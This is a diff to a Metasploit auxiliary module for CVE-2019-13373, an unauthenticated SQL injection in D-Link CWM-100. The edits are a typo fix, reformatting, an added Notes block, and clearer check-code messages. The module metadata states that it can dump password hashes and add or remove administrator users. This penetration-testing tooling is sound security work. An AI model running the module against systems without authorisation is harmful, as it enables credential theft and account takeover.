@@ -22,28 +22,30 @@ class MetasploitModule < Msf::Auxiliary
           of SQL queries without authentication, using this vulnerability, it's
           possible to retrieve usernames and password hashes of registered users,
           device configuration, and other data, it's also possible to add users,
-          or edit database informations.
+          or edit database information.
         },
         'License' => MSF_LICENSE,
-        'Author' =>
-          [
-            'M3@ZionLab from DBAppSecurity',
-            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
-          ],
-        'References' =>
-          [
-            ['CVE', '2019-13373'],
-            ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
-          ],
-        'Actions' =>
-          [
-            [ 'SQLI_DUMP', { 'Description' => 'Retrieve all the data from the database' } ],
-            [ 'ADD_ADMIN', { 'Description' => 'Add an administrator user' } ],
-            [ 'REMOVE_ADMIN', { 'Description' => 'Remove an administrator user' } ]
-          ],
+        'Author' => [
+          'M3@ZionLab from DBAppSecurity',
+          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
+        ],
+        'References' => [
+          ['CVE', '2019-13373'],
+          ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
+        ],
+        'Actions' => [
+          [ 'SQLI_DUMP', { 'Description' => 'Retrieve all the data from the database' } ],
+          [ 'ADD_ADMIN', { 'Description' => 'Add an administrator user' } ],
+          [ 'REMOVE_ADMIN', { 'Description' => 'Remove an administrator user' } ]
+        ],
         'DefaultOptions' => { 'SSL' => true },
         'DefaultAction' => 'SQLI_DUMP',
-        'DisclosureDate' => '2019-07-06'
+        'DisclosureDate' => '2019-07-06',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -76,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
         res.body[%r{<column>(.+)</column>}m, 1] || ''
       else
         if res
-          check_error = Exploit::CheckCode::Safe
+          check_error = Exploit::CheckCode::Safe('Target responded but does not appear vulnerable')
         else
           check_error = Exploit::CheckCode::Unknown('Failed to send HTTP request')
         end
@@ -84,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
     vulnerable_test = sqli.test_vulnerable
-    check_error || (vulnerable_test ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe)
+    check_error || (vulnerable_test ? Exploit::CheckCode::Vulnerable('SQL injection confirmed') : Exploit::CheckCode::Safe('SQL injection test did not succeed'))
   end
 
   def dump_data(sqli)
